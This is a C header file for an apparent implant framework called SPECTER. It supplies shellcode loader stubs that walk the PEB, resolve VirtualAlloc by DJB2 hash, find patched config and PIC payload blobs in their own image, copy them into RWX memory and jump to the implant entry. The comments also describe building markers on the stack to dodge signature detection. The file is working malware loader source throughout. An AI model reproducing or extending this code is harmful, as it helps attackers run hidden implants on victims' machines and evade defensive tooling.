/**
 * SPECTER Stubs -- Common Definitions
 *
 * Shared types, PEB walk, DJB2 hashing, and marker scanning used by
 * all pre-compiled PE template stubs.  Each stub is a standalone
 * binary (CRT-free, no stdlib) that the payload builder patches with
 * config and PIC blob data at build time.
 *
 * Build: x86_64-w64-mingw32-gcc -nostdlib -ffreestanding
 */

#ifndef STUB_COMMON_H
#define STUB_COMMON_H

/* ------------------------------------------------------------------ */
/*  Primitive types (mirrors specter.h, self-contained)                */
/* ------------------------------------------------------------------ */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned short      USHORT;
typedef unsigned int        DWORD;
typedef unsigned long long  QWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  SIZE_T;
typedef long                LONG;
typedef int                 BOOL;
typedef unsigned int        ULONG;
typedef unsigned short      WCHAR;

typedef void                VOID;
typedef void*               PVOID;
typedef void*               HANDLE;
typedef BYTE*               PBYTE;
typedef DWORD*              PDWORD;
typedef WCHAR*              PWCHAR;

#ifndef NULL
#define NULL ((void*)0)
#endif
#define TRUE  1
#define FALSE 0

/* ------------------------------------------------------------------ */
/*  Windows constants                                                  */
/* ------------------------------------------------------------------ */

#define DLL_PROCESS_ATTACH   1
#define DLL_PROCESS_DETACH   0
#define DLL_THREAD_ATTACH    2
#define DLL_THREAD_DETACH    3

#define MEM_COMMIT           0x00001000
#define MEM_RESERVE          0x00002000
#define PAGE_EXECUTE_READWRITE 0x40

/* ------------------------------------------------------------------ */
/*  DJB2 hashes (pre-computed, case-insensitive)                       */
/*  Regenerate with: python3 compute_hashes.py                         */
/*  Verified against specter.h / sleep.h known values.                 */
/* ------------------------------------------------------------------ */

#define HASH_KERNEL32_DLL   0x7040EE75  /* "kernel32.dll" (from specter.h) */
/* VirtualAlloc hash -- regenerate with compute_hashes.py if needed */
#define HASH_VIRTUALALLOC   0x58DACBD7  /* "VirtualAlloc" */

/* ------------------------------------------------------------------ */
/*  PE structures (minimal for export parsing)                         */
/* ------------------------------------------------------------------ */

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWCHAR Buffer;
} UNICODE_STRING;

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY  InLoadOrderLinks;
    LIST_ENTRY  InMemoryOrderLinks;
    LIST_ENTRY  InInitializationOrderLinks;
    PVOID       DllBase;
    PVOID       EntryPoint;
    ULONG       SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG       Length;
    BOOL        Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE        InheritedAddressSpace;
    BYTE        ReadImageFileExecOptions;
    BYTE        BeingDebugged;
    BYTE        BitField;
    BYTE        Padding0[4];
    PVOID       Mutant;
    PVOID       ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef struct _IMAGE_DOS_HEADER {
    WORD  e_magic;
    WORD  e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc;
    WORD  e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
    WORD  e_res[4];
    WORD  e_oemid, e_oeminfo;
    WORD  e_res2[10];
    LONG  e_lfanew;
} IMAGE_DOS_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD  Magic;
    BYTE  MajorLinkerVersion, MinorLinkerVersion;
    DWORD SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData;
    DWORD AddressOfEntryPoint, BaseOfCode;
    QWORD ImageBase;
    DWORD SectionAlignment, FileAlignment;
    WORD  MajorOperatingSystemVersion, MinorOperatingSystemVersion;
    WORD  MajorImageVersion, MinorImageVersion;
    WORD  MajorSubsystemVersion, MinorSubsystemVersion;
    DWORD Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
    WORD  Subsystem, DllCharacteristics;
    QWORD SizeOfStackReserve, SizeOfStackCommit;
    QWORD SizeOfHeapReserve, SizeOfHeapCommit;
    DWORD LoaderFlags, NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_FILE_HEADER {
    WORD  Machine, NumberOfSections;
    DWORD TimeDateStamp, PointerToSymbolTable, NumberOfSymbols;
    WORD  SizeOfOptionalHeader, Characteristics;
} IMAGE_FILE_HEADER;

typedef struct _IMAGE_NT_HEADERS64 {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD Characteristics, TimeDateStamp;
    WORD  MajorVersion, MinorVersion;
    DWORD Name, Base, NumberOfFunctions, NumberOfNames;
    DWORD AddressOfFunctions, AddressOfNames, AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;

/* ------------------------------------------------------------------ */
/*  VirtualAlloc function pointer type                                 */
/* ------------------------------------------------------------------ */

typedef PVOID (__attribute__((ms_abi)) *fn_VirtualAlloc)(
    PVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/* ------------------------------------------------------------------ */
/*  Inline helpers                                                     */
/* ------------------------------------------------------------------ */

static inline void stub_memcpy(void *dst, const void *src, SIZE_T n) {
    PBYTE d = (PBYTE)dst;
    const BYTE *s = (const BYTE *)src;
    while (n--) *d++ = *s++;
}

static inline void stub_memset(void *dst, int c, SIZE_T n) {
    PBYTE d = (PBYTE)dst;
    while (n--) *d++ = (BYTE)c;
}

static inline int stub_memcmp(const void *a, const void *b, SIZE_T n) {
    const BYTE *pa = (const BYTE *)a;
    const BYTE *pb = (const BYTE *)b;
    while (n--) {
        if (*pa != *pb) return (int)*pa - (int)*pb;
        pa++; pb++;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/*  DJB2 hashing (narrow, case-insensitive)                            */
/* ------------------------------------------------------------------ */

static inline DWORD stub_djb2(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = (unsigned char)*str++)) {
        if (c >= 'A' && c <= 'Z') c += 0x20;
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

/* DJB2 for wide strings (WCHAR) */
static inline DWORD stub_djb2_w(const WCHAR *str) {
    DWORD hash = 5381;
    WCHAR c;
    while ((c = *str++)) {
        if (c >= L'A' && c <= L'Z') c += 0x20;
        hash = ((hash << 5) + hash) + (DWORD)c;
    }
    return hash;
}

/* ------------------------------------------------------------------ */
/*  PEB access (x64: GS:[0x60])                                       */
/* ------------------------------------------------------------------ */

static inline PPEB stub_get_peb(void) {
    PPEB peb;
    __asm__ volatile (
        "mov %0, gs:[0x60]"
        : "=r" (peb)
        :
        : "memory"
    );
    return peb;
}

/* ------------------------------------------------------------------ */
/*  Module resolution via PEB InLoadOrderModuleList                    */
/* ------------------------------------------------------------------ */

static inline PVOID stub_find_module(DWORD hash) {
    PPEB peb = stub_get_peb();
    if (!peb || !peb->Ldr)
        return NULL;

    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)entry;
        if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
            if (stub_djb2_w(mod->BaseDllName.Buffer) == hash)
                return mod->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Export resolution via PE export directory                           */
/* ------------------------------------------------------------------ */

static inline PVOID stub_find_export(PVOID module_base, DWORD hash) {
    if (!module_base)
        return NULL;

    PBYTE base = (PBYTE)module_base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != 0x5A4D)
        return NULL;

    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
    if (nt->Signature != 0x00004550)
        return NULL;

    IMAGE_DATA_DIRECTORY exp_dir = nt->OptionalHeader.DataDirectory[0];
    if (exp_dir.VirtualAddress == 0)
        return NULL;

    IMAGE_EXPORT_DIRECTORY *exports =
        (IMAGE_EXPORT_DIRECTORY *)(base + exp_dir.VirtualAddress);

    PDWORD addr_of_funcs    = (PDWORD)(base + exports->AddressOfFunctions);
    PDWORD addr_of_names    = (PDWORD)(base + exports->AddressOfNames);
    WORD  *addr_of_ordinals = (WORD *)(base + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char *)(base + addr_of_names[i]);
        if (stub_djb2(name) == hash) {
            WORD ordinal = addr_of_ordinals[i];
            DWORD rva = addr_of_funcs[ordinal];
            return (PVOID)(base + rva);
        }
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Resolve VirtualAlloc from kernel32                                 */
/* ------------------------------------------------------------------ */

static inline fn_VirtualAlloc stub_resolve_virtualalloc(void) {
    PVOID k32 = stub_find_module(HASH_KERNEL32_DLL);
    if (!k32)
        return NULL;
    return (fn_VirtualAlloc)stub_find_export(k32, HASH_VIRTUALALLOC);
}

/* ------------------------------------------------------------------ */
/*  Marker definitions (must match PayloadBuilder in mod.rs)           */
/*                                                                     */
/*  Config marker:                                                     */
/*    [0x43 x 16]["CCCCCCCCCCCCCCCC"]                                  */
/*    [max_size: u32 LE]                                               */
/*    [zero-pad: max_size bytes]                                       */
/*                                                                     */
/*  PIC blob marker:                                                   */
/*    "SPECPICBLOB\x00" (12 bytes)                                     */
/*    [size: u32 LE]    (0 = no blob yet)                              */
/*    [blob data...]                                                   */
/* ------------------------------------------------------------------ */

#define CONFIG_MARKER_LEN   16
#define CONFIG_MAX_CAPACITY 4096
#define PIC_MARKER_LEN      12
#define PIC_MAX_CAPACITY    (512 * 1024)  /* 512 KB max PIC blob */

/* Build markers on the stack to avoid static .rodata signatures.
   Use these helper macros inside functions that need them. */
#define BUILD_CONFIG_MARKER(var) \
    BYTE var[CONFIG_MARKER_LEN]; \
    stub_memset(var, 0x43, CONFIG_MARKER_LEN)

#define BUILD_PIC_MARKER(var) \
    BYTE var[PIC_MARKER_LEN]; \
    var[0]='S'; var[1]='P'; var[2]='E'; var[3]='C'; \
    var[4]='P'; var[5]='I'; var[6]='C'; var[7]='B'; \
    var[8]='L'; var[9]='O'; var[10]='B'; var[11]='\0'

/* ------------------------------------------------------------------ */
/*  Scan for a marker in the stub's own image                          */
/*  Returns pointer to the first byte after the marker, or NULL.       */
/* ------------------------------------------------------------------ */

static inline PBYTE stub_find_marker_in_image(
    PBYTE image_base, SIZE_T image_size,
    const BYTE *marker, SIZE_T marker_len
) {
    if (image_size < marker_len)
        return NULL;

    SIZE_T limit = image_size - marker_len;
    for (SIZE_T i = 0; i < limit; i++) {
        if (stub_memcmp(image_base + i, marker, marker_len) == 0)
            return image_base + i + marker_len;
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Retrieve own image base and size from PEB                          */
/* ------------------------------------------------------------------ */

static inline PVOID stub_get_image_base(void) {
    PPEB peb = stub_get_peb();
    if (!peb)
        return NULL;
    return peb->ImageBaseAddress;
}

static inline SIZE_T stub_get_image_size(PVOID image_base) {
    PBYTE base = (PBYTE)image_base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != 0x5A4D)
        return 0;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
    return (SIZE_T)nt->OptionalHeader.SizeOfImage;
}

/* ------------------------------------------------------------------ */
/*  Core stub payload execution logic                                  */
/*                                                                     */
/*  1. Resolve VirtualAlloc                                            */
/*  2. Find config marker -> read config_len + config_blob             */
/*  3. Find PIC marker -> read pic_size + pic_blob                     */
/*  4. Allocate RWX, copy PIC + config, jump to PIC entry              */
/*                                                                     */
/*  PIC memory layout: [PIC blob][config_len: u32 LE][config_blob]     */
/*  (Same as format_raw in the builder)                                */
/* ------------------------------------------------------------------ */

typedef void (__attribute__((ms_abi)) *fn_implant_entry)(PVOID param);

typedef void (__attribute__((ms_abi)) *fn_ExitProcess_stub)(DWORD code);

/* Global so WinMainCRTStartup can read it after stub_execute_payload returns */
static DWORD g_stub_exit_code = 0;

static inline void stub_execute_payload(void) {
    #define STUB_FAIL(code) do { g_stub_exit_code = (code); return; } while(0)

    /* Step 1: Resolve VirtualAlloc */
    fn_VirtualAlloc pVirtualAlloc = stub_resolve_virtualalloc();
    if (!pVirtualAlloc)
        STUB_FAIL(100);

    /* Step 2: Get own image base + size for scanning */
    PVOID image_base = stub_get_image_base();
    if (!image_base)
        STUB_FAIL(101);

    SIZE_T image_size = stub_get_image_size(image_base);
    if (image_size == 0)
        STUB_FAIL(102);

    PBYTE base = (PBYTE)image_base;

    /* Step 3: Find config marker (built on stack to avoid .rodata signature) */
    BUILD_CONFIG_MARKER(cfg_marker);
    PBYTE config_ptr = stub_find_marker_in_image(
        base, image_size, cfg_marker, CONFIG_MARKER_LEN);
    if (!config_ptr)
        STUB_FAIL(103);

    /* config_ptr now points to [max_size: u32 LE][config data...] */
    DWORD config_max_size = *(DWORD *)config_ptr;
    PBYTE config_data = config_ptr + sizeof(DWORD);

    /* Read actual config length (first 4 bytes of config data, written by builder) */
    DWORD config_len = *(DWORD *)config_data;
    PBYTE config_blob = config_data + sizeof(DWORD);

    /* Validate config length */
    if (config_len == 0 || config_len > config_max_size)
        STUB_FAIL(104);

    /* Step 4: Find PIC blob marker (built on stack to avoid .rodata signature) */
    BUILD_PIC_MARKER(pic_marker);
    PBYTE pic_ptr = stub_find_marker_in_image(
        base, image_size, pic_marker, PIC_MARKER_LEN);
    if (!pic_ptr)
        STUB_FAIL(105);

    /* pic_ptr now points to [pic_size: u32 LE][entry_offset: u32 LE][pic data...] */
    DWORD pic_size = *(DWORD *)pic_ptr;
    DWORD pic_entry_off = *(DWORD *)(pic_ptr + sizeof(DWORD));
    PBYTE pic_data = pic_ptr + sizeof(DWORD) + sizeof(DWORD);

    if (pic_size == 0)
        STUB_FAIL(106);
    if (pic_entry_off >= pic_size)
        pic_entry_off = 0; /* safety fallback */

    /* Step 5: Allocate RWX memory for PIC blob + config.
       The implant scans up to CONFIG_SCAN_MAX (512KB) from pic_base for the
       config magic. Ensure the allocation covers that range so the scan
       never reads unmapped memory. VirtualAlloc zero-fills, so the extra
       pages beyond (pic + config) are safe to scan over. */
    SIZE_T data_size = (SIZE_T)pic_size + sizeof(DWORD) + (SIZE_T)config_len;
    SIZE_T alloc_size = data_size < 0x80000 ? 0x80000 : data_size;
    PVOID exec_mem = pVirtualAlloc(
        NULL, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem)
        STUB_FAIL(107);

    /* Step 6: Copy PIC blob */
    stub_memcpy(exec_mem, pic_data, pic_size);

    /* Step 7: Append config after PIC blob: [config_len: u32 LE][config_blob] */
    PBYTE config_dst = (PBYTE)exec_mem + pic_size;
    *(DWORD *)config_dst = config_len;
    stub_memcpy(config_dst + sizeof(DWORD), config_blob, config_len);

    /* Step 8: Jump to PIC entry point at the builder-patched offset */
    fn_implant_entry entry = (fn_implant_entry)((PBYTE)exec_mem + pic_entry_off);
    entry(NULL);

    #undef STUB_FAIL
}

#endif /* STUB_COMMON_H */
